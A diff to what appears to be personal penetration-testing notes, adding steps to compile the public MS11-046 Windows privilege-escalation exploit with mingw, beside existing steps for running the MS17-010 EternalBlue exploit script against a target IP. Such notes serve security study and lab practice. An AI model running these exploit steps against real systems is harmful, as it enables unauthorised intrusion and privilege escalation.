@@ -76,4 +76,13 @@ git clone https://github.com/worawit/MS17-010.git
 * Run the following: python MS17-010/eternalblue_exploit7.py <ip> /tmp/sc_x<arch>.bin
 * Need listener
 
+### Windows
+#### MS11-046
+
+* use the https://www.exploit-db.com/exploits/40564
+* compile:
+  * i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32 (apt install mingw-w64)
+* no need listener (insta run)
+
+
  
